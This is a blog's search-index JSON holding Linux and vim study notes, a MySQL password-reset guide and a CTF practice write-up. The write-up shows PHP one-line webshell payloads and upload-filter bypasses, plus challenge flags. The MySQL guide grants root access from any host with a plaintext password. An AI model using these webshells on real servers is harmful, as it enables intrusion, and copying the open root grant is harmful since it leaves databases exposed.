{"meta":{"title":"huhu","subtitle":"myhの博客","description":"本科 | 软件工程 | 网络安全","author":"huhu","url":"https://huhu-myh.github.io","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2022-01-13T11:49:03.080Z","comments":true,"path":"404.html","permalink":"https://huhu-myh.github.io/404.html","excerpt":"","text":""},{"title":"","date":"2022-01-13T11:49:03.178Z","updated":"2022-01-13T11:49:03.178Z","comments":true,"path":"baidu_verify_xxxxxxx.html","permalink":"https://huhu-myh.github.io/baidu_verify_xxxxxxx.html","excerpt":"","text":"wvlc3L96QK"},{"title":"","date":"2022-01-13T11:49:03.180Z","updated":"2022-01-13T11:49:03.180Z","comments":true,"path":"google1xxxxxxx0.html","permalink":"https://huhu-myh.github.io/google1xxxxxxx0.html","excerpt":"","text":"google-site-verification: google110e5e5e14c8dcf0.html"},{"title":"about","date":"2022-01-13T16:00:00.000Z","updated":"2022-01-14T03:04:02.974Z","comments":true,"path":"about/index.html","permalink":"https://huhu-myh.github.io/about/index.html","excerpt":"","text":""},{"title":"放松一下","date":"2019-08-10T08:41:10.000Z","updated":"2022-01-13T11:49:03.090Z","comments":true,"path":"List/index.html","permalink":"https://huhu-myh.github.io/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2022-01-13T11:49:03.178Z","comments":true,"path":"archives/index.html","permalink":"https://huhu-myh.github.io/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2022-01-13T11:49:03.179Z","comments":true,"path":"categories/index.html","permalink":"https://huhu-myh.github.io/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2022-01-13T11:49:03.180Z","comments":true,"path":"friends/index.html","permalink":"https://huhu-myh.github.io/friends/index.html","excerpt":"","text":""},{"title":"留言板","date":"2019-10-24T16:00:00.000Z","updated":"2022-01-14T01:37:55.640Z","comments":true,"path":"contact/index.html","permalink":"https://huhu-myh.github.io/contact/index.html","excerpt":"","text":"畅所欲言 在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 myhの友链信息 博客名称: myhの博客 博客网址: https://huhu-myh.github.io/ 博客头像: https://t7.baidu.com/it/u=2674910008,1354282542&amp;fm=193?qq-pf-to=pcqq.c2c 博客介绍: The harder you work, the luckier you will be"},{"title":"统计","date":"2020-10-31T02:11:28.000Z","updated":"2022-01-13T11:49:03.179Z","comments":true,"path":"census/index.html","permalink":"https://huhu-myh.github.io/census/index.html","excerpt":"","text":""},{"title":"资源分享","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.181Z","comments":true,"path":"resource/index.html","permalink":"https://huhu-myh.github.io/resource/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.182Z","comments":true,"path":"tags/index.html","permalink":"https://huhu-myh.github.io/tags/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.091Z","comments":true,"path":"List/music/index.html","permalink":"https://huhu-myh.github.io/List/music/index.html","excerpt":"","text":""},{"title":"相册","date":"2022-01-13T11:49:03.085Z","updated":"2022-01-13T11:49:03.085Z","comments":true,"path":"List/galleries/index.html","permalink":"https://huhu-myh.github.io/List/galleries/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2022-01-13T11:49:03.091Z","comments":true,"path":"List/tools/index.html","permalink":"https://huhu-myh.github.io/List/tools/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2022-01-13T11:49:03.091Z","comments":true,"path":"List/movies/index.html","permalink":"https://huhu-myh.github.io/List/movies/index.html","excerpt":"","text":""},{"title":"二次元风","date":"2022-01-13T11:49:03.086Z","updated":"2022-01-13T11:49:03.086Z","comments":true,"path":"List/galleries/二次元风/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"乖巧小狗","date":"2022-01-13T11:49:03.085Z","updated":"2022-01-13T11:49:03.085Z","comments":true,"path":"List/galleries/乖巧小狗/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"呆萌猫咪","date":"2022-01-13T11:49:03.087Z","updated":"2022-01-13T11:49:03.087Z","comments":true,"path":"List/galleries/呆萌猫咪/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"动漫插画","date":"2022-01-13T11:49:03.086Z","updated":"2022-01-13T11:49:03.086Z","comments":true,"path":"List/galleries/动漫插画/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"城市风光","date":"2022-01-13T11:49:03.088Z","updated":"2022-01-13T11:49:03.088Z","comments":true,"path":"List/galleries/城市风光/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"清新花卉","date":"2022-01-13T11:49:03.088Z","updated":"2022-01-13T11:49:03.088Z","comments":true,"path":"List/galleries/清新花卉/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"动漫人物","date":"2022-01-13T11:49:03.086Z","updated":"2022-01-13T11:49:03.086Z","comments":true,"path":"List/galleries/动漫人物/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"动漫风景","date":"2022-01-13T11:49:03.087Z","updated":"2022-01-13T11:49:03.087Z","comments":true,"path":"List/galleries/动漫风景/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"炫酷跑车","date":"2022-01-13T11:49:03.089Z","updated":"2022-01-13T11:49:03.089Z","comments":true,"path":"List/galleries/炫酷跑车/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"璀璨星空","date":"2022-01-13T11:49:03.089Z","updated":"2022-01-13T11:49:03.089Z","comments":true,"path":"List/galleries/璀璨星空/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"自然风景","date":"2022-01-13T11:49:03.090Z","updated":"2022-01-13T11:49:03.090Z","comments":true,"path":"List/galleries/自然风景/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"甜美食品","date":"2022-01-13T11:49:03.090Z","updated":"2022-01-13T11:49:03.090Z","comments":true,"path":"List/galleries/甜美食品/index.html","permalink":"https://huhu-myh.github.io/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""}],"posts":[{"title":"Linux学习-第四章","slug":"Linux学习-第四章","date":"2022-01-22T08:37:01.000Z","updated":"2022-01-22T10:42:35.786Z","comments":true,"path":"posts/myh10010.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10010.html","excerpt":"","text":"第四章：进阶bash shell命令4.1 监测程序4.1.1 探查进程在讲探查进程之前先说明一下什么是进程。进程：运行在系统上的程序。要监测这些进程，需要熟悉ps命令的用法。 ps命令好比工具中的瑞士军刀，它能输出运行在系统上的所有程序的许多信息。 root@VM-16-11-debian:~# ps PID TTY TIME CMD 26084 pts/0 00:00:00 bash 26098 pts/0 00:00:00 ps #PID : Process ID,显示了当前程序的进程ID #TTY : 属于哪个终端 #TIME: 运行的时长 默认情况下， ps命令只会显示运行在当前控制台下的属于当前用户的进程。 此例我们只运行了bash shell（注意， shell也只是运行在系统上的另一个程序而已）以及ps命令本身。 下面讲解一下ps命令对应的部分参数及其作用: 参数 描述 -A 显示所有进程 -N 显示与指定参数不符的所有进程 -a 显示除控制进程（ session leader）和无终端进程外的所有进程 -d 显示除控制进程外的所有进程 -e 显示所有进程 -c 显示进程的额外调度器信息 -f 显示完整格式的输出 -l 显示长列表 命令参数还有很多，也不需要都记住，只需要记住最常用的就好。经常把参数组合起来用是不错的方法，比如-ef命令，可以查看系统上运行的所有进程并且显示一些经常需要的信息： root@VM-16-11-debian:~# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 Jan21 ? 00:00:02 /sbin/init root 2 0 0 Jan21 ? 00:00:00 [kthreadd] root 3 2 0 Jan21 ? 00:00:00 [rcu_gp] root 4 2 0 Jan21 ? 00:00:00 [rcu_par_gp] root 6 2 0 Jan21 ? 00:00:00 [kworker/0:0H-kblockd] root 7 2 0 Jan21 ? 00:00:00 [kworker/u4:0-events_unbound] root 8 2 0 Jan21 ? 00:00:00 [mm_percpu_wq] root 9 2 0 Jan21 ? 00:00:01 [ksoftirqd/0] root 10 2 0 Jan21 ? 00:00:29 [rcu_sched] root 11 2 0 Jan21 ? 00:00:00 [rcu_bh] …… UID：启动这些进程的用户。 PID：进程的进程ID。 PPID：父进程的进程号（如果该进程是由另一个进程启动的）。 C：进程生命周期中的CPU利用率。 STIME：进程启动时的系统时间。 TTY：进程启动时的终端设备。 TIME：运行进程需要的累计CPU时间。 CMD：启动的程序名称 如果需要更多信息使用-l参数，也可以结合使用： root@VM-16-11-debian:~# ps -le F S UID PID PPID C PRI NI ADDR SZ WCHAN TTY TIME CMD 4 S 0 1 0 0 80 0 - 26326 do_epo ? 00:00:02 systemd 1 S 0 2 0 0 80 0 - 0 - ? 00:00:00 kthreadd 1 I 0 3 2 0 60 -20 - 0 - ? 00:00:00 rcu_gp 1 I 0 4 2 0 60 -20 - 0 - ? 00:00:00 rcu_par_gp 1 I 0 6 2 0 60 -20 - 0 - ? 00:00:00 kworker/0:0H-kblockd 1 I 0 7 2 0 80 0 - 0 - ? 00:00:00 kworker/u4:0-events_unbound 1 I 0 8 2 0 60 -20 - 0 - ? 00:00:00 mm_percpu_wq 1 S 0 9 2 0 80 0 - 0 - ? 00:00:01 ksoftirqd/0 1 I 0 10 2 0 80 0 - 0 - ? 00:00:29 rcu_sched F：内核分配给进程的系统标记。 S：进程的状态（ O代表正在运行； S代表在休眠； R代表可运行，正等待运行； Z代表僵化，进程已结束但父进程已不存在； T代表停止）。 PRI：进程的优先级（越大的数字代表越低的优先级）。 NI：谦让度值用来参与决定优先级。 ADDR：进程的内存地址。 SZ：假如进程被换出，所需交换空间的大致大小。 WCHAN：进程休眠的内核函数的地址。 4.1.2 实时探测进程ps命令虽然在收集运行在系统上的进程信息时非常有用，但也有不足之处：它只能显示某个特定时间 。如果想观察那些频繁换进换出的内存的进程趋势，用ps命令就不方便了。 top命令刚好适用这种情况。 top命令跟ps命令相似，能够显示进程信息，但它是实时显的。 输出的第一部分显示的是系统的概况：第一行显示了当前时间、系统的运行时间、登录的用户数以及系统的平均负载。平均负载有3个值：最近1分钟的、最近5分钟的和最近15分钟的平均负载。值越大说明系统的负载越高。由于进程短期的突发性活动，出现最近1分钟的高负载值也很常见，但如果近15分钟内的平均负载都很高，就说明系统可能有问题。 说明:Linux系统管理的要点在于定义究竟到什么程度才算是高负载。这个值取决于系统的硬件配置以及系统上通常运行的程序。对某个系统来说是高负载的值可能对另一系统来说就是正常值。通常，如果系统的负载值超过了2，就说明系统比较繁忙了。 第二行显示了进程概要信息——top命令的输出中将进程叫作任务（ task）：有多少进程处在运行、休眠、停止或是僵化状态（僵化状态是指进程完成了，但父进程没有响应）。 第三行显示了CPU的概要信息。 top根据进程的属主（用户还是系统）和进程的状态（运行、空闲还是等待）将CPU利用率分成几类输出。 紧跟其后的两行说明了系统内存的状态。第一行说的是系统的物理内存：总共有多少内存，当前用了多少，还有多少空闲。后一行说的是同样的信息，不过是针对系统交换空间（如果分配了的话）的状态而言的。 后一部分显示了当前运行中的进程的详细列表，有些列跟ps命令的输出类似： PID：进程的ID。 USER：进程属主的名字。 PR：进程的优先级。 NI：进程的谦让度值。 VIRT：进程占用的虚拟内存总量。 RES：进程占用的物理内存总量。 SHR：进程和其他进程共享的内存总量。 S：进程的状态（ D代表可中断的休眠状态， R代表在运行状态， S代表休眠状态， T代表跟踪状态或停止状态， Z代表僵化状态，I代表空闲的任务（进程），这是比较新版的内核中新增的状态。） %CPU：进程使用的CPU时间比例。 %MEM：进程使用的内存占可用内存的比例。 TIME+：自进程启动到目前为止的CPU时间总量。 COMMAND：进程所对应的命令行名称，也就是启动的程序名。 在top命令运行时键入可改变top的行为。键入f允许你选择对输出进行排序的字段，键入d允许你修改轮询间隔。键入q可以退出top。 4.1.3 结束进程有时进程挂起了，只需要动动手让进程重新运行或结束就行了。但有时，有的进程会耗尽CPU且不释放资源。在这两种情景下，你就需要能控制进程的命令。 Linux沿用了Unix进行进程间通信的方法。 在Linux中，进程之间通过信号来通信。进程的信号就是预定义好的一个消息，进程能识别它并决定忽略还是作出反应。进程如何处理信号是由开发人员通过编程来决定的。大多数编写完善的程序都能接收和处理标准Unix进程信号。 信号 名称 描述 1 HUP 挂起 2 INT 中断 3 QUIT 结束运行 9 KILL 无条件终止 11 SEGV 段错误 15 TERM 尽可能终止 17 STOP 无条件停止运行，但不终止 18 TSTP 停止或暂停，但继续在后台运行 19 CONT 在STOP或TSTP之后恢复执行 kill命令 ： 要发送进程信号，你必须是进程的属主或登录为root用户。 kill命令可通过进程ID（ PID）给进程发信号。默认情况下， kill命令会向命令行中列出的全部PID发送一个TERM信号。遗憾的是，你只能用进程的PID而不能用命令名，所以kill命令有时并不好用。 $ kill 3940 -bash: kill: (3940) - Operation not permitted $ TERM信号告诉进程可能的话就停止运行。不过，如果有不服管教的进程，那它通常会忽略这个请求。如果要强制终止， -s参数支持指定其他信号（用信号名或信号值）。 # kill -s HUP 3940 # 可以看出kill命令不会有任何输出。 要检查kill命令是否有效，可再运行ps或top命令，看看问题进程是否已停止。 killall命令： killall命令支持通过进程名而不是PID来结束进程。 killall命令也支持通配符，这在系统因负载过大而变得很慢时很有用。 警告 以root用户身份登录系统时，使用killall命令要特别小心，因为很容易就会误用通配符而结束了重要的系统进程。这可能会破坏文件系统。 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"MPI学习","slug":"MPI学习","date":"2022-01-22T07:15:38.000Z","updated":"2022-01-22T10:39:25.517Z","comments":true,"path":"posts/myh10009.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10009.html","excerpt":"","text":"一、MPI本次学习基于：https://mpitutorial.com/tutorials/ ，MPI教程。 https://zhuanlan.zhihu.com/p/355652501 动态学习，一点一点补~","categories":[{"name":"ASC","slug":"ASC","permalink":"https://huhu-myh.github.io/categories/ASC/"}],"tags":[{"name":"MPI","slug":"MPI","permalink":"https://huhu-myh.github.io/tags/MPI/"}],"author":"myh"},{"title":"buuctf练习[11-20]","slug":"buuctf练习-11-20","date":"2022-01-19T07:07:24.000Z","updated":"2022-01-20T08:40:06.250Z","comments":true,"path":"posts/myh10008.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10008.html","excerpt":"","text":"11.[极客大挑战 2019]Knife题目都告诉了是白给的shell，直接连就好了拿到webshell，找到根目录下有个flag，读取拿到flag: 12.[极客大挑战 2019]Http考察的主要是http头部的一些信息，按着改就行了。首先那道题进入网页看到源码里面隐藏一个：Secret.php，进入后看到提示信息： It doesn’t come from ‘https://Sycsecret.buuoj.cn'，直接抓包改： 加个Referer: https://Sycsecret.buuoj.cn， 看到又说必须使用”syclover browser”,接着改User-Agent 这又说必须本地访问，再改X-Forwarded-For拿到flag: 这里讲一下这三个参数： Referer: 浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL(你从哪来的)。 User-Agent: 浏览器表明自己的身份（是哪种浏览器）。 X-Forwarded-For: 表示 HTTP 请求端真实 IP。 13.[极客大挑战 2019]Upload好久没做文件上传的题了，有点难到我了。 首先上传一个一句话木马试试： &lt;?php eval($_POST['shell'])?&gt; 显示：NOT IMAGE，那就抓包先改COntent-Type:image/jpeg: 接着说不能是php，绕过后缀的有文件格式有php,php3,php4,php5,phtml，phtm，前几个试试都不行，那就试试phtml： 接着是不能含有’&lt;?’ ，那就再改，查到了一个payload: &lt;script language=\"php\"&gt;eval($_REQUEST[shell])&lt;/script&gt; 接着说不是图片，那就是检查了头部信息，加特征信息，成功上传： GIF89a? &lt;script language=\"php\"&gt;eval($_REQUEST[1])&lt;/script&gt; 最后在连的时候要猜一下文件上传到哪里了！常规的目录/upload下面，然后直接连 /upload/2.phtml 就可以了 蚁剑连一下flag就在根目录，拿到flag:flag{07b9cce3-4089-4384-a26a-4572c9c90566}。 总体思路大概就是先上传个马，看返回信息，然后对应改就可以了，还有很多过滤，以后慢慢遇见~ 这里推荐一篇博客，讲解了一句话木马的原理：https://blog.csdn.net/weixin_39190897/article/details/86772765 14.[ACTF2020 新生赛]Upload这题和上题差不多，多了一个前端验证，所以可以先制作一个图片木马上传抓包，然后改文件后缀为：phtml，成功上传，然后就可以直接连了拿到webshell： 拿到flag：flag{7facc008-0a13-457f-9a24-3f63516cd0c8}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://huhu-myh.github.io/categories/CTF/"}],"tags":[{"name":"buu练习","slug":"buu练习","permalink":"https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"}],"author":"myh"},{"title":"Linux学习-第三章","slug":"Linux学习-第三章","date":"2022-01-17T06:38:08.000Z","updated":"2022-01-22T08:37:23.536Z","comments":true,"path":"posts/myh10007.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10007.html","excerpt":"","text":"第三章：使用编辑器3.1 检查vim软件包，安装vim有的发行版默认的vim编辑器并不是完整的包，只是vim.tiny ，提供少量的编辑功能。所以首先检查一下包： $ which vi /usr/bin/vi $ readlink -f /usr/bin/vi #readlink –f命令能够立刻找出链接文件的最后一环。 /usr/bin/vim.tiny 此时就要安装vim： $ sudo apt-get install vim $ readlink -f /usr/bin/vi /usr/bin/vim.basic #安装成功了 3.2 vim基础启动vim编辑器: $ vim file 如在启动vim时未指定文件名，或者这个文件不存在， vim会开辟一段新的缓冲区域来编辑。如果你在命令行下指定了一个已有文件的名字， vim会将文件的整个内容都读到一块缓冲区域来准备编辑 。 vim编辑器会检测会话终端的类型，并用全屏模式将整个控制台窗口作为编辑器区域。最初的vim编辑窗口显示了文件的内容（如果有内容的话），并在窗口的底部显示了一条消息行。如果文件内容并未占据整个屏幕， vim会在非文件内容行放置一个波浪线 。如图： vim编辑器有两种操作模式： 普通模式 插入模式 刚打开要编辑的文件时（或新建一个文件时）， vim编辑器会进入普通模式。在普通模式中， vim编辑器会将按键解释成命令。 在插入模式下， vim会将你在当前光标位置输入的每个键都插入到缓冲区。按下i键就可以进入插入模式。要退出插入模式回到普通模式，按下键盘上的退出键（ ESC键）就可以了。 在普通模式中，可以用方向键在文本区域移动光标 或者使用如下键： h：左移一个字符。 j：下移一行（文本中的下一行）。 k：上移一行（文本中的上一行）。 l：右移一个字符。 在大的文本文件中一行一行地来回移动会特别麻烦，幸而vim提供了一些能够提高移动速度的命令。 PageDown（或Ctrl+F）：下翻一屏。 PageUp（或Ctrl+B）：上翻一屏。 G：移到缓冲区的最后一行。 num G：移动到缓冲区中的第num行。 gg：移到缓冲区的第一行。 vim编辑器在普通模式下有个特别的功能叫命令行模式。命令行模式提供了一个交互式命令行，可以输入额外的命令来控制vim的行为。要进入命令行模式，在普通模式下按下冒号键。光标会移动到消息行，然后出现冒号，等待输入命令。 在命令行模式下有几个命令可以将缓冲区的数据保存到文件中并退出vim。 q：如果未修改缓冲区数据，退出 q!：取消所有对缓冲区数据的修改并退出。 w filename：将文件保存到另一个文件中。 wq：将缓冲区数据保存到文件中并退出。 3.3 编辑数据在插入模式下，你可以向缓冲区插入数据。然而有时将数据输入到缓冲区中后，你需要再对其进行添加或删除。在普通模式下， vim编辑器提供了一些命令来编辑缓冲区中的数据。下表列出了一些常用的vim编辑命令。 命令 描述 dd 删除当前光标所在行 x 删除当前光标所在位置的字符 dw 删除当前光标所在位置的单词 d$ 删除当前光标所在位置至行尾的内容 u 撤销前一编辑命令 J 删除当前光标所在行行尾的换行符（拼接行） A 在当前光标所在行行尾追加数据（直接进入了插入模式） a 在当前光标后追加数据（直接进入了插入模式） r char 用char替换当前光标所在位置的单个字符 说明 在vim编辑器的普通模式下使用退格键（ Backspace键）和删除键（ Delete键）时要留心。vim编辑器通常会将删除键识别成x命令的功能，删除当前光标所在位置的字符。 vim编辑器在普通模式下通常不识别退格键。 3.4 复制和粘贴3.4.1 粘贴内容vim在删除数据时，实际上会将数据保存在单独的一个寄存器中。可以用p命令取回数据。 举例来说，可以用dd命令删除一行文本，然后把光标移动到缓冲区的某个要放置该行文本的位置，然后用p命令。该命令会将文本插入到当前光标所在行之后。可以将它和任何删除文本的命令一起搭配使用。 (注意p命令粘贴的只是上一次删除的内容。) 3.4.2 复制内容vim中复制命令是y（代表yank）。可以在y后面使用和d命令相同的第二字符（ yw表示复制一个单词， y$表示复制到行尾）。在复制文本后，把光标移动到你想放置文本的地方，输入p命令。复制的文本就会出现在该位置 。 3.4.3 复制内容-可视化模式按下v键进入可视化模式。下一步，移动光标来覆盖你想要复制的文本（甚至可以向下移动几行来复制更多行的文本）。在移动光标时， vim会高亮显示复制区域的文本。在覆盖了要复制的文本后，按y键来激活复制命令。移动光标到要放置的位置，使用p命令来粘贴。 3.5 查找和替换3.5.1 查找按下斜线 /键，光标会跑到消息行，然后vim会显示出斜线。在输入你要查找的文本后，按下回车键。会出现三种可能的结果： 要查找的文本出现在光标当前位置之后，则光标会跳到该文本出现的第一个位置。 要查找的文本未在光标当前位置之后出现，则光标会绕过文件末尾，出现在该文本所在的第一个位置（并用一条消息指明）。 输出一条错误消息，说明在文件中没有找到要查找的文本。 要继续查找同一个单词，按下斜线键，然后按回车键。或者使用n键，表示下一个（ next）。 3.5.2 替换必须进入命令行模式才能使用替换命令。替换命令的格式是：:s/old/new/ ，vim编辑器会跳到old第一次出现的地方，并用new来替换。 可以对替换命令作一些修改来替换多处文本： :s/old/new/g：替换光标所在行的所有old。 :n,ms/old/new/g：替换行号n和m之间所有old。 :%s/old/new/g：替换整个文件中的所有old。 :%s/old/new/gc：替换整个文件中的所有old，但在每次出现时提示。 这里就是基本的vim编辑器命令，需要经常使用增加手指记忆，还有许多其他的编辑器，先学会这个再学学别的~ 文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)","categories":[{"name":"学习","slug":"学习","permalink":"https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"Linux登录mysql报错","slug":"Linux登录mysql报错","date":"2022-01-16T03:53:04.000Z","updated":"2022-01-16T07:19:22.142Z","comments":true,"path":"posts/myh10006.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10006.html","excerpt":"","text":"mysql登录报错：ERROR 1045 (28000)在使用xshell连接服务器登陆mysql的时候，出现Access denied for user ‘root’@’localhost’ (using password: YES) 拒绝访问。emmm这就很尴尬，接着我登上服务器的终端也不行，查了一下解决方法如下： 1、vim /etc/my.cnf文件sudo vim /etc/my.cnf 在 [mysqld] 后添加 skip-grant-tables （跳过检查），然后按esc、ZZ退出。 2、重启MySQL服务：sudo systemctl restart mysqld 3、修改密码set password for 'root'@'localhost'=password('你的密码'); 可能会出现 ERROR 1290 (HY000): The MySQL server is running with the –skip-grant-tables option so it cannot execute this statement 的报错，输入 ：flush privileges; flush privileges; 4、再次重新设置密码set password for 'root'@'localhost'=password('你的密码'); 5、重设远程访问GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'Mingloveyh1314' WITH GRANT OPTION; 6、把skip-grant-tables删除sudo vim /etc/my.cnf 7、重启MySQLsudo systemctl restart mysqld 之后就可以正常登陆了~","categories":[{"name":"运维","slug":"运维","permalink":"https://huhu-myh.github.io/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://huhu-myh.github.io/tags/linux/"}],"author":"myh"},{"title":"Linux学习-第二章","slug":"Linux学习-第二章","date":"2022-01-15T09:28:46.000Z","updated":"2022-01-17T08:26:56.560Z","comments":true,"path":"posts/myh10005.html","link":"","permalink":"https://huhu-myh.github.io/posts/myh10005.html","excerpt":"","text":"第二章：基本的 bash shell 命令2.1浏览文件系统2.1.1 Linux文件系统Linux不同于WIndows，在路径名中不使用驱动器盘符。 Linux将文件存储在单个目录结构中，这个目录被称为虚拟目录（ virtual directory）。虚拟目录将安装在PC上的所有存储设备的文件路径纳入单个目录结构中。Linux虚拟目录结构只包含一个称为根（ root）目录的基础目录。根目录下的目录和文件会按照访问它们的目录路径一一列出，这点跟Windows类似。 在Linux PC上安装的第一块硬盘称为根驱动器。根驱动器包含了虚拟目录的核心，其他目录都是从那里开始构建的。Linux会在根驱动器上创建一些特别的目录，我们称之为挂载点（ mount point）。挂载点是虚拟目录中用于分配额外存储设备的目录。虚拟目录会让文件和目录出现在这些挂载点目录中，然而实际上它们却存储在另外一个驱动器中。 如图Disk1硬盘和虚拟目录的根目录关联起来。Disk2硬盘就可以挂载到虚拟目录结构中的任何地方。在这个例子中，第二块硬盘被挂载到了/home位置，home这个目录就是一个挂载点，用户目录都位于这个位置。 ​ 常见的Linux目录名称 / 虚拟目录的根目录。通常不会在这里存储文件 /bin 二进制目录，存放许多用户级的GNU工具 /bot 启动目录，存放启动文件 /dev 设备目录， Linux在这里创建设备节点 /etc 系统配置文件目录 /home 主目录， Linux在这里创建用户目录 /lib 库目录，存放系统和应用程序的库文件 /media 媒体目录，可移动媒体设备的常用挂载点 /mnt 挂载目录，另一个可移动媒体设备的常用挂载点 /opt 可选目录，常用于存放第三方软件包和数据文件 /proc 进程目录，存放现有硬件及当前进程的相关信息 /root root用户的主目录 /sbin 系统二进制目录，存放许多GNU管理员级工具 /run 运行目录，存放系统运作时的运行时数据 /srv 服务目录，存放本地服务的相关文件 /sys 系统目录，存放系统硬件信息的相关文件 /tmp 临时目录，可以在该目录中创建和删除临时工作文件 /usr 用户二进制目录，大量用户级的GNU工具和数据文件都存储在这里 /var 可变目录，用以存放经常变化的文件，比如日志文件 2.1.2 遍历目录在Linux文件系统上，可以使用切换目录命令cd将shell会话切换到另一个目录。 cd命令的格式非常简单：cd destinationcd命令可接受单个参数destination，用以指定想切换到的目录名。如果没有为cd命令指定目标路径，它将切换到用户主目录。destination参数可以用两种方式表示：一种是使用绝对文件路径，另一种是使用相对文件路径。 1.绝对文件路径 ​ 对文件路径总是以正斜线（ /）作为起始，指明虚拟文件系统的根目录。 如图刚开始是在/root目录中，如果切换到usr/bin目录中，就直接使用 cd /usr/bin，（一定最开始是根目录！） 这里的 pwd 是显示当前所在的位置的命令。 2.相对文件路径 就是基于你目前所在的目录进行相对的移动。 如图，刚开始在usr目录中，要进入usr的lib目录中，则可以直接 cd lib 。（ls 是显示当前目录下的文件和子目录，后面会讲。） 有两个特殊字符可用于相对文件路径中： 单点符（ .），表示当前目录； 双点符（ ..），表示当前目录的父目录。 重点就是双点符，可以较为方便的在相对文件路径中使用： 2.2 文件和目录列表2.2.1 基本列表功能ls [path] - 列出文件 该程序ls允许您列出目录中的文件和其子目录。它可以传递许多不同的参数（或“标志”）来控制输出。 ls -F 带-F参数的ls命令轻松区分文件和目录 Linux经常采用隐藏文件来保存配置信息。在Linux上，隐藏文件通常是文件名以点号开始的文件。这些文件并没有在默认的ls命令输出中显示出来，因此我们称其为隐藏文件。 ls支持选项合并如：ls -Fa ls -l 显示附加信息，长列表输出 文件类型，比如目录（ d）、文件（ -）、字符型文件（ c）或块设备（ b）； 文件的权限； 文件的硬链接总数； 文件属主的用户名； 文件属组的组名； 文件的大小（以字节为单位）； 文件的上次修改时间； 文件名或目录名。 2.2.2 过滤输出列表当要输出指定文件或者指定开头等的文件时，可以使用过滤查询：ls -l x ，过滤器就是一个进行简单文本匹配的字符串。可以在要用的命令行参数之后添加这个过滤器 。同时支持通配符匹配。 问号（ ?）代表一个字符； 星号（ *）代表零个或多个字符。 2.2.3 tree还有一个遍历文件功能指令tree,能较好地展示文件之间的层级结构，将本目录中的文件、子目录、子目录中的文件都以树形展示出来：（Debian 版本没有这个指令，可以apt-get tree安装），不要尝试tree /,除非你觉着很炫酷hhhh 2.3 处理文件2.3.1 创建文件touch命令轻松创建空文件（注意是空文件，不代表可以是空目录哦）。 $ touch test_one 2.3.2 复制文件cp命令将文件或目录从一个位置复制到另一个位置 。 $ cp &lt;source&gt; &lt;destination&gt; - 复制文件 -i选项，强制shell询问是否需要覆盖已有文件。 -R参数，可以用它在一条命令中递归地复制整个目录的内容 可以看到加上 -i 选项，就会强制询问是否覆盖，最好每次都带上，写 yes/no 就可。可以看到修改时间没变。 